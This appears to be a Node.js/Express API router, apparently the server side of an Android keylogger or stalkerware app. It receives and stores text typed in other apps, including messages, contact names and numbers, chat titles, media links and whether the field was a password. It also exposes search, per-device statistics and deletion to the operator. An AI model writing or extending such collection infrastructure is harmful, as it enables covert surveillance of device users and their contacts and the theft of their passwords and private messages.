const express = require('express');
const router = express.Router();
const TextInput = require('../models/TextInput');
const { authenticateApiKey } = require('../middleware/auth');

// POST /api/text-inputs - Save text input
router.post('/', authenticateApiKey, async (req, res) => {
    try {
        console.log('Received text input data:', JSON.stringify(req.body, null, 2));
        
        const {
            id,
            timestamp,
            packageName,
            appName,
            deviceId,
            messageId,
            // Essential message content
            text,
            completeMessage,
            eventType,
            // Contact & Conversation Information
            contactName,
            contactNumber,
            chatTitle,
            conversationName,
            recipientInfo,
            isGroupChat,
            participantCount,
            // Media information
            hasMedia,
            mediaType,
            mediaFileName,
            mediaUploaded,
            mediaDownloadUrl,
            // Basic UI info
            isPassword,
            isEditable,
            // Device info
            deviceModel,
            androidVersion,
            // Custom metadata
            customMetadata
        } = req.body;

        // Validate required fields
        if (!id || !packageName || !appName || !text || !eventType || !deviceId) {
            return res.status(400).json({
                success: false,
                message: 'Missing required fields: id, packageName, appName, text, eventType, deviceId'
            });
        }

        // Sanitize data to prevent MongoDB validation errors
        const sanitizeValue = (value) => {
            if (value === null || value === undefined) return null;
            if (typeof value === 'object') {
                try {
                    return JSON.parse(JSON.stringify(value));
                } catch (e) {
                    return String(value);
                }
            }
            return value;
        };

        // Build id from messageId when provided to keep one record per message
        const effectiveId = (req.body.customMetadata && req.body.customMetadata.messageId)
            ? `${packageName}:${req.body.customMetadata.messageId}`
            : id;

        // Create text input data matching the Android app's simplified model
        const textInputData = {
            id: sanitizeValue(effectiveId),
            timestamp: timestamp ? new Date(timestamp) : new Date(),
            packageName: sanitizeValue(packageName),
            appName: sanitizeValue(appName),
            deviceId: sanitizeValue(deviceId),
            messageId: sanitizeValue(messageId),
            
            // Essential message content
            text: sanitizeValue(text),
            completeMessage: sanitizeValue(completeMessage) || '',
            eventType: sanitizeValue(eventType),
            
            // Contact & Conversation Information
            contactName: sanitizeValue(contactName) || null,
            contactNumber: sanitizeValue(contactNumber) || null,
            chatTitle: sanitizeValue(chatTitle) || null,
            conversationName: sanitizeValue(conversationName) || null,
            recipientInfo: sanitizeValue(recipientInfo) || null,
            isGroupChat: isGroupChat || false,
            participantCount: participantCount || 0,
            
            // Media information
            hasMedia: hasMedia || false,
            mediaType: sanitizeValue(mediaType) || null,
            mediaFileName: sanitizeValue(mediaFileName) || null,
            mediaUploaded: mediaUploaded || false,
            mediaDownloadUrl: sanitizeValue(mediaDownloadUrl) || null,
            
            // Basic UI info
            isPassword: isPassword || false,
            isEditable: isEditable || false,
            
            // Device info
            deviceModel: sanitizeValue(deviceModel) || '',
            androidVersion: sanitizeValue(androidVersion) || '',
            
            // Custom metadata
            customMetadata: sanitizeValue(customMetadata) || {}
        };

        console.log('Creating text input with data:', JSON.stringify(textInputData, null, 2));

        // Use upsert to prevent duplicates and update existing records
        const result = await TextInput.findOneAndUpdate(
            { id: textInputData.id },
            textInputData,
            { 
                upsert: true, 
                new: true,
                runValidators: true 
            }
        );

        console.log('Text input saved successfully:', result._id);

        res.status(200).json({
            success: true,
            message: 'Text input saved successfully',
            data: {
                id: result._id,
                textInputId: result.id,
                text: result.text,
                completeMessage: result.completeMessage,
                packageName: result.packageName,
                appName: result.appName,
                timestamp: result.timestamp
            }
        });

    } catch (error) {
        console.error('Error saving text input:', error);
        
        // Handle specific MongoDB validation errors
        if (error.name === 'ValidationError') {
            const validationErrors = Object.values(error.errors).map(err => err.message);
            return res.status(400).json({
                success: false,
                message: 'Validation error',
                errors: validationErrors
            });
        }
        
        // Handle duplicate key errors
        if (error.code === 11000) {
            return res.status(409).json({
                success: false,
                message: 'Text input already exists',
                duplicateKey: error.keyValue
            });
        }
        
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/text-inputs - Get all text inputs
router.get('/', authenticateApiKey, async (req, res) => {
    try {
        const { 
            page = 1, 
            limit = 50, 
            packageName, 
            deviceId, 
            startDate, 
            endDate,
            hasMedia,
            isGroupChat,
            search 
        } = req.query;

        // Build filter object
        const filter = {};
        
        if (packageName) filter.packageName = packageName;
        if (deviceId) filter.deviceId = deviceId;
        if (hasMedia !== undefined) filter.hasMedia = hasMedia === 'true';
        if (isGroupChat !== undefined) filter.isGroupChat = isGroupChat === 'true';
        
        // Date range filter
        if (startDate || endDate) {
            filter.timestamp = {};
            if (startDate) filter.timestamp.$gte = new Date(startDate);
            if (endDate) filter.timestamp.$lte = new Date(endDate);
        }
        
        // Text search
        if (search) {
            filter.$or = [
                { text: { $regex: search, $options: 'i' } },
                { completeMessage: { $regex: search, $options: 'i' } },
                { contactName: { $regex: search, $options: 'i' } },
                { chatTitle: { $regex: search, $options: 'i' } }
            ];
        }

        const pageNum = parseInt(page);
        const limitNum = parseInt(limit);
        const skip = (pageNum - 1) * limitNum;

        const textInputs = await TextInput.find(filter)
            .sort({ timestamp: -1 })
            .skip(skip)
            .limit(limitNum)
            .lean();

        const total = await TextInput.countDocuments(filter);

        res.status(200).json({
            success: true,
            data: {
                textInputs,
                pagination: {
                    page: pageNum,
                    limit: limitNum,
                    total,
                    pages: Math.ceil(total / limitNum)
                }
            }
        });

    } catch (error) {
        console.error('Error fetching text inputs:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/text-inputs/stats - Get statistics
router.get('/stats', authenticateApiKey, async (req, res) => {
    try {
        const { deviceId, packageName, startDate, endDate } = req.query;

        // Build filter object
        const filter = {};
        if (deviceId) filter.deviceId = deviceId;
        if (packageName) filter.packageName = packageName;
        
        // Date range filter
        if (startDate || endDate) {
            filter.timestamp = {};
            if (startDate) filter.timestamp.$gte = new Date(startDate);
            if (endDate) filter.timestamp.$lte = new Date(endDate);
        }

        const stats = await TextInput.aggregate([
            { $match: filter },
            {
                $group: {
                    _id: null,
                    totalTextInputs: { $sum: 1 },
                    uniqueApps: { $addToSet: '$packageName' },
                    uniqueDevices: { $addToSet: '$deviceId' },
                    mediaCount: { $sum: { $cond: ['$hasMedia', 1, 0] } },
                    groupChatCount: { $sum: { $cond: ['$isGroupChat', 1, 0] } },
                    avgTextLength: { $avg: { $strLenCP: '$text' } },
                    avgParticipantCount: { $avg: '$participantCount' }
                }
            },
            {
                $project: {
                    _id: 0,
                    totalTextInputs: 1,
                    uniqueApps: { $size: '$uniqueApps' },
                    uniqueDevices: { $size: '$uniqueDevices' },
                    mediaCount: 1,
                    groupChatCount: 1,
                    avgTextLength: { $round: ['$avgTextLength', 2] },
                    avgParticipantCount: { $round: ['$avgParticipantCount', 2] }
                }
            }
        ]);

        // Get app breakdown
        const appBreakdown = await TextInput.aggregate([
            { $match: filter },
            {
                $group: {
                    _id: '$packageName',
                    count: { $sum: 1 },
                    appName: { $first: '$appName' },
                    hasMedia: { $sum: { $cond: ['$hasMedia', 1, 0] } },
                    isGroupChat: { $sum: { $cond: ['$isGroupChat', 1, 0] } }
                }
            },
            { $sort: { count: -1 } },
            { $limit: 10 }
        ]);

        res.status(200).json({
            success: true,
            data: {
                stats: stats[0] || {
                    totalTextInputs: 0,
                    uniqueApps: 0,
                    uniqueDevices: 0,
                    mediaCount: 0,
                    groupChatCount: 0,
                    avgTextLength: 0,
                    avgParticipantCount: 0
                },
                appBreakdown
            }
        });

    } catch (error) {
        console.error('Error fetching text input stats:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// GET /api/text-inputs/:id - Get specific text input
router.get('/:id', authenticateApiKey, async (req, res) => {
    try {
        const textInput = await TextInput.findOne({ id: req.params.id });
        
        if (!textInput) {
            return res.status(404).json({
                success: false,
                message: 'Text input not found'
            });
        }

        res.status(200).json({
            success: true,
            data: textInput
        });

    } catch (error) {
        console.error('Error fetching text input:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

// DELETE /api/text-inputs/:id - Delete specific text input
router.delete('/:id', authenticateApiKey, async (req, res) => {
    try {
        const result = await TextInput.findOneAndDelete({ id: req.params.id });
        
        if (!result) {
            return res.status(404).json({
                success: false,
                message: 'Text input not found'
            });
        }

        res.status(200).json({
            success: true,
            message: 'Text input deleted successfully',
            data: { id: result._id }
        });

    } catch (error) {
        console.error('Error deleting text input:', error);
        res.status(500).json({
            success: false,
            message: 'Internal server error',
            error: error.message
        });
    }
});

module.exports = router;